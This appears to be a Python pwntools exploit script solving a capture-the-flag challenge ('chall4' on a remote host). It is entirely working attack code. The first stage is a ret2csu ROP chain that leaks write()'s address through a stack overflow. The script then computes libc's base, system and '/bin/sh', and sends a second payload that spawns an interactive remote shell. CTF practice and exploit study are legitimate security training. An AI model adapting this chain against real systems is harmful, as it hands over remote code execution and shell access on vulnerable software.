from struct import pack
from pwn import *

lib_csu = 0x400670
write_plt = 0x601018
gadget2 =  0x4006b0
main = 0x4005f6
ret = 0x400660
poprdi = 0x4006d3
write_call = 0x4004b0

# r = process('./chall4')
r = remote('hack.bckdr.in', 15104)

p = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR'
p += p64(lib_csu + 90)
p += p64(0x0)
p += p64(0x1)
p += p64(write_plt)
p += p64(0x8)
p += p64(write_plt)
p += p64(0x1)
p += p64(gadget2)
p += 'A'*7*8
p += p64(main)

r.sendline(p)
pause(1)

d = r.recv(1024)
addr = d[28:-27]

libc = ELF('./chall4 libc.so.6') 

write_addr = struct.unpack("Q", addr)[0]
print "write() is at ", hex(write_addr)

libc_bin_sh = 0x18cd57
# libc_bin_sh = 0x1b3e9a
libc_write = libc.symbols['write']
libc_system = libc.symbols['system']
libc_exit = libc.symbols['exit']

libc_base = write_addr - libc_write

system_addr = libc_base + libc_system
bin_sh = libc_base + libc_bin_sh
exit_addr = libc_base + libc_exit

print "libc base is at", hex(libc_base)
print "system() is at", hex(system_addr)
print "bin_sh is at", hex(bin_sh)

exploit = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
exploit += p64(poprdi)
exploit += p64(bin_sh)
exploit += p64(ret)
exploit += p64(system_addr)

r.sendline(exploit)
r.interactive()
